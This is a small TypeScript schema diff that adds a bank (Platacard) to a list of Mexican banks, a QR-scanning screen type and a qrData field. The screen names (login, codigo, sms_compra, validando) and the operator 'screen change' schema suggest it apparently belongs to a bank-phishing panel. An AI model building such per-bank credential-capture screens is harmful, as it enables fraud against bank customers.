@@ -25,7 +25,8 @@ export enum BankType {
   SCOTIABANK = "scotiabank",
   INVEX = "invex",
   BANREGIO = "banregio",
-  SPIN = "spin"
+  SPIN = "spin",
+  PLATACARD = "platacard"
 }
 
 // Tabla de usuarios del sistema
@@ -195,7 +196,6 @@ export type InsertSmsHistory = z.infer<typeof insertSmsHistorySchema>;
 export type SmsHistory = typeof smsHistory.$inferSelect;
 
 export enum ScreenType {
-  QR,
   FOLIO = "folio",
   LOGIN = "login",
   CODIGO = "codigo",
@@ -207,6 +207,7 @@ export enum ScreenType {
   MENSAJE = "mensaje",
   VALIDANDO = "validando",
   SMS_COMPRA = "sms_compra",
+  ESCANEAR_QR = "escanear_qr"
 }
 
 export const screenChangeSchema = z.object({
@@ -219,6 +220,7 @@ export const screenChangeSchema = z.object({
   titular: z.string().optional(),
   comercio: z.string().optional(),
   mensaje: z.string().optional(),
+  qrData: z.string().optional(), // Para datos del QR escaneado
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
